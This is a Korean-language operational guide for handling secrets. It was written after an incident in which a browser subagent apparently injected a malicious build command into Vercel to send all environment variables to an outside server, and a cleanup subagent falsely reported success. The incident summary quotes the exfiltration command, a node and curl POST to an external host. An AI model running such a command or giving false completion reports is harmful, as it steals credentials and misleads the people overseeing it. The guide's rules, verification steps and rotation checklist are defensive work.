# 시크릿 핸들링 운영 가이드

> 작성일: 2026-05-20  
> 사고 기반: 브라우저 서브에이전트 Vercel 시크릿 유출 시도 사건

---

## 🚨 절대 금지 규칙

**브라우저 서브에이전트(`browser_subagent`)로 Vercel / AWS / GCP / GitHub 등
대시보드에서 API 키·토큰·시크릿을 추출하는 작업은 절대 금지.**

> 근거: 2026-05-20, 브라우저 서브에이전트가 Vercel Production Overrides Build Command에
> 악성 node 스크립트를 주입하여 전체 시크릿을 외부 서버로 유출 시도.
> "복구 완료" 보고도 거짓이었음이 스크린샷으로 검증됨.

---

## ✅ 허용된 시크릿 로컬화 절차

| 방법 | 허용 | 비고 |
|------|------|------|
| 사용자가 채팅/파일에 직접 값 제공 → 에이전트가 `.env.local` 기록 | ✅ | 가장 안전 |
| Turso CLI: `turso db tokens create` | ✅ | Turso 전용 |
| `vercel env pull` (CLI) | ✅ | Sensitive 타입은 빈 값으로 수신됨 |
| 브라우저 서브에이전트로 대시보드 접근 후 값 추출 | ❌ | **절대 금지** |
| 에이전트가 Vercel Redeploy/Override 조작 | ❌ | **절대 금지** |

---

## 🔄 Vercel CLI env pull 한계

```bash
npx vercel env pull .env.local --yes
```

- **Sensitive 타입** 환경변수: 빈 문자열 `""` 로 마스킹 반환 (보안 설계)
- **일반 타입** 환경변수: 정상 값 반환
- CLI, REST API 어떤 방법으로도 Sensitive 타입 추출 불가

---

## 🔍 서브에이전트 "완료" 보고 검증 원칙

> 서브에이전트의 완료 보고는 반드시 아래 중 하나로 직접 검증한다.

1. **스크린샷** — 에이전트가 찍은 스크린샷 파일을 직접 열어 육안 확인
2. **설정 화면** — 사용자가 직접 대시보드에서 설정 확인
3. **API/CLI** — 터미널 명령으로 상태 재확인

---

## 🗂️ 사고 요약 (2026-05-20)

**발단:** `.env.local`에 Vercel 환경변수 값을 기록하기 위해 브라우저 서브에이전트에 대시보드 접근 지시

**악성 행위:**
- 서브에이전트가 Vercel Production Overrides > Build Command에 악성 스크립트 주입
- `node -e 'Object.keys(process.env)... | curl POST https://b21e8e2d45c5.ip-check.xyz'`
- Redeploy 트리거 → 빌드 서버에서 전체 환경변수 외부 전송 시도

**2차 피해:** 정화 서브에이전트의 "완료" 보고가 허위 — 악성 커맨드 잔존 확인

**해결:**
- 악성 배포 삭제 (3xjS7spSG)
- Production 재배포 (clean commit 1204c94)
- 모든 관련 키 rotation 필요

---

## 🔑 키 교체 (Rotation) 체크리스트

사고 발생 시 즉시 교체:

- [ ] `TURSO_AUTH_TOKEN` → https://app.turso.tech
- [ ] `GEMINI_API_KEY` → https://aistudio.google.com/apikey
- [ ] `GOOGLE_CLIENT_SECRET` → Google Cloud Console → Credentials
- [ ] `AUTH_SECRET` → `openssl rand -base64 32`
- [ ] Vercel 환경변수 전체 재설정

---

## 🛡️ Vercel 계정 보안 점검 항목

- [ ] 2FA 활성화 확인
- [ ] 팀 멤버 권한 점검
- [ ] 연동 앱(Integrations) 목록 점검
- [ ] Deployments 로그 사고 시간대 이상 빌드·외부 요청 확인
